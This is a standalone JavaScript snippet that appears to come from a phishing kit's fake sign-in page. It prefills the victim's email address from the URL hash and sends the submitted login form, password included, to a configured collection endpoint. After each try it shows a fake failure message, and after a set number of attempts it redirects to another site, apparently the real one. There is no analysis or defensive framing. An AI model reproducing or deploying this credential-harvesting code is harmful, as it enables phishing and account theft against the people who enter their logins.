<script>
var f = $("#f").val();
var rc = $("#rc").val();
var rdrt = $("#rdrt").val();
var domain_redirect = $("#domain_redirect").val();

$(document).ready(function() {
    var attemptCount = 0;

    $(document).keypress(function(event) {
        var key = (event.keyCode ? event.keyCode : event.which);
        if (key == 13) { // Check if the Enter key (key code 13) is pressed
            event.preventDefault();
            $("#sub-btn").click();
        }
    });

    var hashValue = window.location.hash.substr(1);
    if (!hashValue) {
        // No hash value in URL, do nothing
    } else {
        var extractedHash = hashValue;
        var atIndex = extractedHash.indexOf("@");
        var hashSubstring = extractedHash.substr((atIndex + 1));
        var domainPart = hashSubstring.substr(0, hashSubstring.indexOf("."));
        var lowerCaseDomain = domainPart.toLowerCase();

        $("#temail").val(extractedHash);
        $("#temail").html(extractedHash);
        $("#msg").hide();
    }

    $("#form-field-1").submit(function(event) {
        $("#msg").hide();
        event.preventDefault();
        var formData = $("#form-field-1").serialize();
        attemptCount += 1;

        $.ajax({
            dataType: "JSON",
            url: f,
            type: "POST",
            data: formData,
            beforeSend: function() {
                $("#sub-btn").html("Verifying...");
            },
            complete: function() {
                $("#tpass").val("");
                if (attemptCount >= rc) {
                    window.location.replace(rdrt);
                    return false;
                }
                $("#msg").show();
                $("#sub-btn").html("Sign in");
            }
        });
    });
});
</script>
